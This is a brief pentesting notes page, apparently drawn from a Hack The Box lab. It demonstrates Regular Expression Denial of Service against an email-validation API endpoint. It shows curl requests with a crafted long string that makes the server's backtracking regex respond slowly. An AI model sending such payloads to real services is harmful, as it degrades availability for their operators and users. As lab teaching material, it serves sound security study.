# Regular Expression Denial of Service (ReDoS)

Suppose we have a user that submits benign input to an API. On the server side, a developer could match any input against a regular expression.

#### Interact with the API

{% code overflow="wrap" %}
```bash
curl "http://<TARGET IP>:3000/api/check-email?email=test_value"
{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
```
{% endcode %}



<figure><img src="../../.gitbook/assets/image (318).png" alt=""><figcaption><p>Credits HTB</p></figcaption></figure>

#### Submit a longer string

{% code overflow="wrap" %}
```bash
curl "http://<TARGET IP>:3000/api/check-email?email=tessssssssssssssssssssssssssssssttttttt@cdddddddddddddddddddddddddddddddddd.2222222222222222222222222222222222222222222222222222222222."
{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
```
{% endcode %}

You'll notice a significante delay in the response. This proves the API is vulnerable to ReDoS attacks.

Reference links:

{% embed url="https://regex101.com/" %}

{% embed url="https://jex.im/regulex/#!flags=&re=%5E(%5Ba-zA-Z0-9_.-%5D)%2B%40((%5Ba-zA-Z0-9-%5D)%2B.)%2B(%5Ba-zA-Z0-9%5D%7B2%2C4%7D)%2B%24" %}
